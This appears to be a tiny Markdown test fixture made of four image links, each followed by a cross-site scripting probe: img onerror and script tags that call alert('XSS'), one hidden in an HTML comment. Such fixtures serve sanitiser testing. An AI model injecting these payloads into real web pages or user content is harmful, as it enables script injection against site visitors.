![](https://example.com)<img src=x onerror=alert('XSS')>

![](https://example.com)<script>alert('XSS')</script>

![](https://example.com)<!--
<img src=x onerror=alert('XSS')>
-->

![](https://example.com)
<img src=x onerror=alert('XSS')>